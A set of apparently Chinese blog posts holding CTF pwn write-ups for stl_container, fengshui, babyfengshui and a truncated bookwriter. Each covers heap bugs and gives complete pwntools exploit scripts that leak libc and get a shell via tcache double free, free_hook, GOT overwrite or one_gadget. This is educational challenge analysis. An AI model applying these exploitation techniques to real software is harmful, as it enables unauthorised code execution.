[{"title":"De1CTF2020之stl_container","url":"/2020/05/03/stl-container/","content":"\n[stl_container](stl_container)\n[libc-2.27.so](libc-2.27.so)\n\n# 1 触发异常分支\n\n这个题目寻找漏洞点的过程比较曲折，IDA打开发现是c++代码，但是我真的不懂C++，纠结从代码里找漏洞找了一天也没思路。在男票的提醒下，直接触发漏洞，再根据触发的漏洞去理解程序然后利用。\n\nmain函数中可以看到四个stl函数。list和vector函数中实现了add,delete和show。queue和stack中只支持add和delete。\n\n```c\n \t  case 1u:\n        TestList();\n        break;\n      case 2u:\n        TestVector();\n        break;\n      case 3u:\n        TestQueue();\n        break;\n      case 4u:\n        TestStack();\n        break;\n```\n\n由于是堆相关的题目，很自然想到问题大多出在free时，因此对list和vector下的add和delete进行测试。在add两个vector，删除index为0的vector，然后执行show（0）时，打印了一堆无法显示的字符。\n\n```shell\nSTL Container Test\n1. list\n2. vector\n3. queue\n4. stack\n5. exit\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:123\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:qwe\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 2\nindex?\n0\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 3\nindex?\n0\ndata: ���\u001f\u0014V\n```\n\ndata部分应该是访问了非法内存，那么接下来就用gef进行调试，看看是什么原因导致了访问非法内存。\n\n# 2 分析异常原因\n\n申请两个vector，然后查看chunk的分布情况：\n\n```shell\n~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     50 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    Peg..V...eg..V..]\n~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     76 65 63 74 6f 72 32 32 32 0a 00 00 00 00 00 00    vector222.......]\nChunk(addr=0x560ff5676690, size=0xe980, flags=PREV_INUSE)  ←  top chunk\n-----------------------------------------------------------------------------------\ngef➤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff5676550\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\n可以看到0x560ff5676490处依次存放了vector(0) 和vector(1)的字符串地址。接下来删除vector(0)，看看这个地址处和字符串有什么变化，如下。\n\n```shell\n~~~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     f0 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    .eg..V...eg..V..]\n~~~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     b0 64 67 f5 0f 56 00 00 32 0a 00 00 00 00 00 00    .dg..V..2.......]\n--------------------------------------------------------------------------------\ngef➤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff56765f0\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\n可以看到0x560ff5676490处，原本放vector(0)字符串地址的位置被vector(1)字符串地址`0x0000560ff56765f0`覆盖了，而且vector(1)字符串地址处的空间被释放了，vector(0)的字符串`“vector111”`依然在堆中。\n\n执行show(0)时，返回如下信息：\n\n```shell\n[DEBUG] Received 0x4f bytes:\n    00000000  64 61 74 61  3a 20 b0 64  67 f5 0f 56  0a 53 54 4c  │data│: ·d│g··V│·STL│\n    00000010  20 43 6f 6e  74 61 69 6e  65 72 20 54  65 73 74 0a  │ Con│tain│er T│est·│\n    00000020  31 2e 20 6c  69 73 74 0a  32 2e 20 76  65 63 74 6f  │1. l│ist·│2. v│ecto│\n    00000030  72 0a 33 2e  20 71 75 65  75 65 0a 34  2e 20 73 74  │r·3.│ que│ue·4│. st│\n    00000040  61 63 6b 0a  35 2e 20 65  78 69 74 0a  3e 3e 20     │ack·│5. e│xit·│>> │\n    0000004f\ndata: \\xb0dg�V\n```\n\n根据接收到的data可以看出，打印的是`b0 64  67 f5 0f 56`，这个正好对上了此时地址0x560ff56765f0处的内容。\n\n- 分析到这里，可以看出我们在delete 0号vector时，实际发生了这么一个过程：0号vector的字符串地址被从0x560ff5676490空间中删除，并且将1号vector的字符串地址前移一位；然后再free 0号vector的字符串地址，但此时该处已经变成 1号vector的字符串地址；因此导致删除 0号vector却free了 1号vector的字符串地址。而1号vector的字符串地址后续还可以继续被使用，这就是一个悬空指针。\n\n# 3 悬空指针可以做什么\n\n这个悬空指针目前有两种操作：\n\n- delete() - double free。由于这个题是ubuntu18.04下libc-2.27.so，有Tcache，因此一次double free就可以形成一个环，进而任意地址写。可以参考我之前做过的一个链接：https://blingblingxuanxuan.github.io/2020/03/13/TcacheTear/\n- show() - 泄露信息。如libc、堆栈、程序等地址或信息。\n\n## 3.1 泄露libc\n\n通常的做法是将一个chunk free到unsorted bin中，再将这个chunk申请回来，然后打印该chunk内容，就可以计算出libc的地址。\n\n这道题中我们无法控制申请的堆空间的大小，但是每add一个list/vector/queue/stack时，在Test::Init中都有malloc(0x98)，这些chunk在相应的delete操作后都会串到大小为0xa0的Tcache链上。一条Tcache链最多串7个chunk，第8个相同大小的chunk会被放到unsorted bin中。\n\n构造如下顺序的add和delete。最先delete list(1)时，大小为0xa0的Tcache链上会存在一个之前的chunk，此时我们只需delete 6个就可以将vector(0)放到unsorted bin中（实际是将vector(1)的data块扔到了unsorted bin），接下来通过show(vector 0)就可以读取到leak的地址，从而得到malloc_state结构体地址，最后查找libc-2.27.so中malloc_trim()中malloc_state的偏移，就可以计算出libc地址。\n\n```python\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n```\n\n## 3.2 写libc的函数指针\n\n由于本题got表不可写，且开启了PIE。因此考虑写libc中的函数指针，如`__malloc_hook`和`__free_hook`，将函数指针写成one gadget地址，下次调用到malloc或free时就能get shell。\n\n泄露完libc后，需要调整下堆空间的布局，通过double free获取一个环（在Tcache链上），从而去任意地址写。\n\n由于此时Tcache上0xa0链上是满的，因此需要add操作将Tcache链上的chunk用掉一些。我这里add了三次，其中一次必须是add vector(凑齐两个vector)，不然后续无法delete 两次形成double free。\n\n```\none_gadget1 = libc_addr + 0x4f322\nfree_hook_addr = libc_addr + 0x3ed8e8\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n```\n\n在libc-2.27.so中找到三个可用gadget，其中0x4f322可利用成功：\n\n```shell\nbling@Ubuntu1804:/mnt/hgfs/vmshare-1804$ one_gadget libc-2.27.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 2 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\nmyelf = ELF(\"./stl_container\")\nmylibc = ELF(\"./libc-2.27.so\")\nmyproc = process(myelf.path)\n\ndef list_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef list_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef list_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef vector_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef queue_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef queue_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\ndef stack_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef stack_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\n###leak libc###\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nmyproc.recvuntil(\"data: \")\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"leak_addr: 0x%x\" % leak_addr)\n\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n\n### change libc hook###\none_gadget0 = libc_addr + 0x4f2c5\none_gadget1 = libc_addr + 0x4f322\none_gadget2 = libc_addr + 0x10a38c\nmalloc_hook_addr = libc_addr + 0x3ebc30\nfree_hook_addr = libc_addr + 0x3ed8e8\n#free_hook_addr = libc_addr + mylibc.symbols['__free_hook']\nlog.warn(\"malloc_hook_addr: 0x%x\" % malloc_hook_addr)\nlog.warn(\"free_hook_addr: 0x%x\" % free_hook_addr)\nlog.warn(\"one_gadget0: 0x%x\" % one_gadget0)\nlog.warn(\"one_gadget1: 0x%x\" % one_gadget1)\nlog.warn(\"one_gadget2: 0x%x\" % one_gadget2)\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n","categories":["CTF"]},{"title":"fengshui","url":"/2020/04/25/fengshui/","content":"\n- 题目文件：\n\n# 1 分析\n\n## 1.1 程序基本信息\n\n首先查看二进制文件信息：\n\n```shell\n$ file fengshui\nfengshui: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=45b09ec28a895f08b53682ead4e084874ee4b466, stripped\n$ checksec fengshui\n[*] '/mnt/hgfs/vmshare-1604/fengshui/ida/fengshui'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n## 1.2 IDA源码分析\n\n程序有4个功能：添加person，删除person，修改person名字，打印person信息。\n\n### 1.2.1 添加person\n\n![](fengshui-1.png)\n\n\n\n### 1.2.2 删除person\n\n\n\n\n\n### 1.2.3 修改person名字\n\n\n\n\n\n### 1.2.4 打印person信息\n\n\n\n\n\n# 2 利用思路\n\n![](fengshui-2.png)\n\n\n\n![](fengshui-3.png)\n\n\n\n# 3 exp\n\n## 使用one_gadget的方式获取shell\n\n搜索libc中的可用gadget，挨个试试，最后一个在我的机器上可以成功。\n\n```shell\nbling@bling:~$ one_gadget libc-2.23.so \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n\n```\n\n- exp如下\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsh_gadget = libc_base + 0xf1147\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"gadget addr: 0x%x\" % sh_gadget)\n\npayload = \"a\" * 0x40 + p64(73) + p64(0) + p64(sh_gadget) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## 使用system函数获取shell\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmylibc = ELF(\"./libc-2.23.so\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsystem_addr = libc_base + 0x45390\nsh_addr = libc_base + next(mylibc.search(\"/bin/sh\\x00\"))\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"system addr: 0x%x\" % system_addr)\nlog.warn(\"sh addr: 0x%x\" % sh_addr)\n\npayload = \"a\" * 0x40 + p64(73) + p64(sh_addr) + p64(system_addr) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n","categories":["CTF"]},{"title":"babyfengshui","url":"/2020/04/19/babyfengshui/","content":"\n# 1 分析\n\n## 1.1 二进制程序基本信息\n\n```shell\n$ file babyfengshui \nbabyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped\n\n$ checksec babyfengshui \n[*] '/mnt/hgfs/vmshare-1604/babyfengshui/babyfengshui'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n\n```\n\n## 1.2 IDA分析源码流程\n\n程序主要有四个函数：添加用户，删除用户，展示用户信息，升级用户信息。\n\n### 添加用户\n\n```c\n····\nprintf(\"size of description: \");\n__isoc99_scanf(\"%u%c\", &v2, &v0);\nadd_user(v2);\n····\n_DWORD *__cdecl add_user(size_t a1)\n{\n  void *s; // ST24_4\n  _DWORD *v2; // ST28_4\n\n  s = malloc(a1);\n  memset(s, 0, a1);\n  v2 = malloc(0x80u);\n  memset(v2, 0, 0x80u);\n  *v2 = s;\n  ptr[(unsigned __int8)user_num] = v2;\n  printf(\"name: \");\n  get_v1((char *)ptr[(unsigned __int8)user_num] + 4, 0x7C);\n  update_description(++user_num - 1);\n  return v2;\n}\n```\n\n添加用户的代码，做了这么一件事，如下图所示。首先创建一个堆块用来存放description信息，用`*S`指向它；再创建一个堆块，用`*V2`指向它，前四个字节存放description的地址，后面用来存放名字name；最后将bss段的ptr[0]指向`*V2`这个堆块。并将byte_804b069自加1，这个值相当于记录目前一共申请了多少个user。\n\n![](babyfengshui-1.png)\n\n### 删除用户\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndel_user(v2);\n\nunsigned int __cdecl del_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    free(*(void **)ptr[index]);\n    free(ptr[index]);\n    ptr[index] = 0;\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\n删除用户的代码中，将一个用户拥有的两个堆块分别释放，并将bss段对应的ptr[n]置0。虽然此时`*V2`的前四个字节还指向`*S`，但当堆块被扔到bin中时，会做清理，因此不会造成问题。\n\n### 展示用户信息\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndisp_user(v2);\n\nunsigned int __cdecl disp_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    printf(\"name: %s\\n\", (char *)ptr[index] + 4);\n    printf(\"description: %s\\n\", *(_DWORD *)ptr[index]);\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\n这个函数很简单，根据给定的index，将用户的name和description信息打印出来。通过这个函数的功能我们可以猜测，之后泄露信息一定要用到它。\n\n### 升级用户信息\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\nupdate_description(v2);\n\nunsigned int __cdecl update_description(unsigned __int8 index)\n{\n  char v2; // [esp+17h] [ebp-11h]\n  int v3; // [esp+18h] [ebp-10h]\n  unsigned int v4; // [esp+1Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    v3 = 0;\n    printf(\"text length: \");\n    __isoc99_scanf(\"%u%c\", &v3, &v2);\n    if ( (char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4 )\n    {\n      puts(\"my l33t defenses cannot be fooled, cya!\");\n      exit(1);\n    }\n    printf(\"text: \");\n    get_v1(*(char **)ptr[index], v3 + 1);\n  }\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n升级用户信息这个函数乍一看没看出问题，就是不太明白`(char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4`这一个判断的作用是啥，以为不会有漏洞点就跳过了。谁知道！！问题就出在这儿！！\n\n这一判断的目的是，保证当前用户的description块不会覆盖name块。如果分配给一个用户的两个堆块是相邻的，且description块在低地址，name块在高地址的话，这个判断是很有用的。但是如果这两个堆块不相邻，那么问题就来了，位于description块和name块之间的所有堆块都可以被我们的输入覆盖。\n\n因此，我们只要构造一个用户，其两个堆块在另一个用户堆块description块和name块之间即可。\n\n### 利用分析\n\n以添加第一个用户为例，需要我们指定description的堆块大小，还会申请一个固定大小0x80的堆块（该堆块被释放后会进入unsorted bin）。如果指定description大小为fast bin的大小，那么当删除这个用户时（非第一个用户，因为第一个用户的堆chunk紧挨着top chunk，释放后会跟top chunk合并而非进入bin中），description块会进入fast bin，而name块会进入unsorted bin（0x80）。\n\n这时，如果我们添加一个用户，并且指定description大小为0x80，那么unsorted bin中的那个块会被分配给这个用户的description，然后再新生成一个0x80大小的chunk给这个用户做name块。因此就构造了如下图所示的两个用户堆块关系：\n\n![](babyfengshui-2.png)\n\n这样我们调用“升级用户信息”函数更改description A的值，使name B的前四个字节被覆盖为got表中的free表项(泄露free地址，我们要用`（1）system替换free（2）将description A的前几个字节改成“/bin/sh\\x00”`，这样在删除用户free(S)时，就去执行了`system(\"/bin/sh\\x00\")`)，这样当我们调用打印信息时，会去打印free这个got表项存放的真正的free函数地址，从而泄露出free函数地址（根据该地址，结合对应的libc版本，我们可以进一步算出libc基址和system函数地址）。\n\n获得system函数地址后，我们调用升级B用户信息，将system地址写入got表中的free表项，从而实现了free函数的劫持。然后在之前往description A中写信息时，将\"/bin/sh\\x00\"写在起始位置。最后，调用删除函数删除用户A的信息，就可以实现get shell利用了。\n\n# 2 exp\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./babyfengshui')\n#myproc = process(myelf.path)\nmyproc = remote(\"159.138.137.79\",65054)\n\ndef add_user(size,name,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(0))\n    myproc.recvuntil(\"size of description: \")\n    myproc.sendline(str(size))\n    myproc.recvuntil(\"name: \")\n    myproc.sendline(name)\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\ndef del_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef disp_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef update_description(user_index,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\nadd_user(0x10,'name0',0x10,'text0')\nadd_user(0x10,'name1',0x10,'text1')\ndel_user(0)\nadd_user(0x80,'name2',0x80,'text2')\n\npayload = \"/bin/sh\\x00\"+\"a\"*(0xa0 - len(\"/bin/sh\\x00\")) + p32(myelf.got['free'])\nupdate_description(2,len(payload),payload)\ndisp_user(1)\nmyproc.recvuntil('description: ')\nfree_addr = u32(myproc.recv(4))\n\nlibc_base = free_addr - 0x070750\nsystem_addr =  libc_base + 0x03a940\n\n# 将free函数的got表项写成system函数地址\nupdate_description(1,4,p32(system_addr))\n\ndel_user(2)\n#gdb.attach(myproc)\n\nmyproc.interactive()\n```\n\n# 3 libc版本\n\n根据泄露的函数地址的后三位可以确定对应的libc版本，具体操作见如下链接。\n\n参考链接：\nhttps://www.jianshu.com/p/8d2552b8e1a2\nhttps://libc.blukat.me/\n\n# 4 题目参考链接\n\nhttps://blog.csdn.net/Breeze_CAT/article/details/103788631\n","tags":["heap","堆风水"],"categories":["CTF"]},{"title":"pwnable.tw之bookwriter","url":"/2020/04/04/bookwriter/","content":"\n[题目链接](https://pwnable.tw/challenge/#24)\n\n参考wp：\n\n[【PWNABLE.TW】 BookWriter 解题思路](http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/)\n\n[Pwnable.tw之BookWriter](https://bbs.pediy.com/thread-226694.htm)\n\n# 1 分析\n\n查看二进制各项属性：\n\n```shell\n$ file bookwriter\nbookwriter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c3e466870c649d07e84498bb143f1bb5916ae34, stripped\n$ checksec bookwriter \n[*] '/mnt/hgfs/vmshare-1604/bookwriter/bookwriter'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n\n```\n\n- 64位二进制程序，动态链接，去了符号表\n- got表不可写\n- 栈不可执行，开启栈canary\n- 地址随机化未开启\n\n使用IDA分析二进制源码逻辑，存在四个功能，分别是：\n\n- add：添加page和内容\n- view：查看page的内容\n- edit：更改page的内容，并重新调整大小值size\n- information：显示作者姓名\n\n漏洞点有以下几个：\n\n- 未进入while循环前输入作者姓名时，结束符控制有问题。导致后续打印该字符串时可越界读。\n- add函数中的if(i>8)判断有误，导致bss段原本存放size的位置可被覆盖为堆地址\n- edit函数中同样存在第一个问题，在输入字符串时，结束符控制有问题，导致计算strlen时产生一个大于原本字符串的值，后续可以越界写。\n\n# 2 